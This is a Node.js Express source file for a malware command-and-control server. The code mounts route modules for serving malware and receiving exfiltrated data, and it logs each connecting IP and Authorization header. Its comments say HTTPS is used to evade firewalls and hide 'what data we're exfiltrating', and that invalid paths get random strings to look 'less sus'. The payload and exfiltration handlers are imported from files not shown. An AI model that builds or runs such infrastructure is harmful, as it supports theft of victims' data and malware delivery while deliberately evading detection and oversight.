const express = require("express");
const httpHandler = express();
const fs = require("fs");
const https = require("https");
const path = require("path");

const logging = require("./logging.js");
const util = require("./util.js");
const malwareReqs = require("./get_req.js");
const malwareData = require("./post_req.js");
const bodyParser = require("body-parser");

// Enable HTTPS. Ideally, server should only be communicating through encrypted channels.
// This is to prevent firewalls from filtering our request, and to prevent users from notificing what data we're exfiltrating
const server = https.createServer({
    key: fs.readFileSync(path.resolve(__dirname, "./Crypto/priv_key.pem"), {encoding: "utf-8"}),
    cert: fs.readFileSync(path.resolve(__dirname, "./Crypto/cert.pem"), {encoding: "utf-8"}),
    passphrase: "Garfield"      // It's okay; you can use Garfield to decrypt my non-existent private key file
}, httpHandler);

// Redirects to HTTPS if we're not on there yet
httpHandler.use((request, response, next) => {
    if (request.protocol == "https")
    {
        next();
    }
    else
    {
        response.redirect(`https://${request.get("host")}${request.originalUrl}`);
    }
});

// Log incoming traffic info
const MAX_FILE_SIZE = "50mb";
httpHandler.use(bodyParser.text({limit: MAX_FILE_SIZE}));

httpHandler.all("*", (request, response, next) => {
    logging.log("");
    logging.log(`Connection established with ${request.ip} via port ${request.socket.remotePort}.`);
    logging.log(`Request Type: ${request.method}`);
    logging.log(`Request Host: ${request.headers.host}`)
    logging.log(`Auth Key: ${request.headers.authorization}`)

    // logging.log(`Request Cookies: ${request.headers.cookie}`)
    // logging.log(`Request Location: ${request.headers.location}`)
    // logging.log(`Request Auth: ${request.headers.authorization}`)
    
    next();
});

// Handle fetching malware and data exfiltration
httpHandler.use(malwareReqs);
httpHandler.use(malwareData);

// Error handling middleware. Just log the error code and send ASCII.
httpHandler.use((err, request, response, next) => {
    logging.error(err.stack);
    response.status(401).send(util.genAsciiStr(64));
});

// Handle all invalid paths. Generate some random numbers to make it look less sus
httpHandler.all("*", (request, response) => {
    response.send(util.genAsciiStr(64));
});

const PORT = 443;
server.listen(PORT, () => {
    logging.log(`✅ Server launched on port ${PORT}.`, true);
});

httpHandler.listen(80, () => {
    logging.log(`✅ HTTP Redirect Server launched on port 80.`, true);
});